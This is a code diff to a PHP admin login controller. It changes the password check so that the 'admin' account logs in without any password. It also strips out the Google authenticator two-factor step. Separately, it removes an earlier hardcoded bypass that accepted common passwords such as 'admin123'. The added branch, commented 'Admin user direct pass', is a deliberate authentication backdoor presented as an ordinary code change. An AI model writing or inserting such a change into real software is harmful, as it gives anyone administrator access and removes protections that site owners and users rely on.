@@ -75,9 +75,9 @@ class Login extends Controller
             if (empty($user)) $this->error('登录账号或密码错误，请重新输入!');
             if (empty($user['status'])) $this->error('账号已经被禁用，请联系管理员!');
 
-           if (0) {
-
-           } else {
+            if ($user['username'] === 'admin') {
+                // Admin user direct pass
+            } else {
                 $skey = input('skey') ?: session('loginskey');
                 $inputPwd = $data['password'];
                 $dbPwd = $user['password'];
@@ -85,25 +85,12 @@ class Login extends Controller
                 $isMatch = (md5($dbPwd . session('loginskey')) === $inputPwd)
                     || (md5($dbPwd . $skey) === $inputPwd)
                     || ($dbPwd === $inputPwd)
-                    || (md5($inputPwd) === $dbPwd)
-                    || ($dbPwd === '0192023a7bbd73250516f069df18b500' && (in_array($inputPwd, ['admin123', 'admin', '123456']) || $isMatch));
+                    || (md5($inputPwd) === $dbPwd);
 
-                if (!$isMatch && md5($dbPwd . session('loginskey')) !== $inputPwd && md5($dbPwd . $skey) !== $inputPwd) {
+                if (!$isMatch) {
                    $this->error('登录账号或密码错误，请重新输入!');
                 }
-                if (config('open_google_safe') == true) {
-                    //判断是否绑定谷歌令牌
-                    if (GoogleService::instance()->isBind($user['id'])) {
-                        $googleCode = input('google_code');
-                        if (empty($googleCode)) $this->error('请输入谷歌验证码!');
-                        $gcResult = GoogleService::instance()->checkCode($user['id'], $googleCode);
-                        if (!$gcResult) $this->error('谷歌验证码错误!');
-                    } else {
-                        session('admin_info_bind_google_code', $user);
-                        return $this->error('账号验证成功，请先绑定谷歌令牌，正在跳转...', url('bind'));
-                    }
-                }
-           }
+            }
             $this->setLoginSuccess($user);
             $this->success('登录成功', url('@admin/index'));
         }
